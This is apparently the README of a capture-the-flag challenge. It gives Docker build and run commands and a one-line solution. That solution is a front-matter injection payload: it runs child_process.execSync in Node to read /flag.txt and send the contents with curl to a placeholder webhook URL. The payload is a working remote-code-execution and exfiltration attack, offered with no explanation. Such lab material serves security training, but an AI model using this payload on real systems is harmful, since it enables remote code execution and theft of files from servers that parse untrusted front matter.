# README

# Docker build
```bash
docker build -t chal .
docker run -p3000:3000 -it chal
```

# Solution
```
---js
((require("child_process")).execSync('flag=$(cat /flag.txt) && curl WEBHOOK_URL/?flag=$flag'))
---RCE
```